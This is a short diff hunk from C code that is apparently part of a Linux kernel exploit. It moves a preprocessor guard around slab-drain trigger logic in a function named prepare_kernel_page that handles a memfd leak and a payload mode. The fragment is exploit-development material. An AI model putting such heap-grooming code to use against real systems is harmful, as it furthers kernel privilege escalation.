@@ -1317,10 +1317,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
   size_t drain_triggers = prepare_ctx.mm_cnt / mm_objs_per_slab;
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #ifdef APP_MM_LATE_DRAIN_TRIGGERS
   drain_triggers = APP_MM_LATE_DRAIN_TRIGGERS;
 #endif
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   pid_t deferred_reap_children[drain_triggers ? drain_triggers : 1];
   size_t deferred_reap_count = 0;
   memset(deferred_reap_children, 0, sizeof(deferred_reap_children));
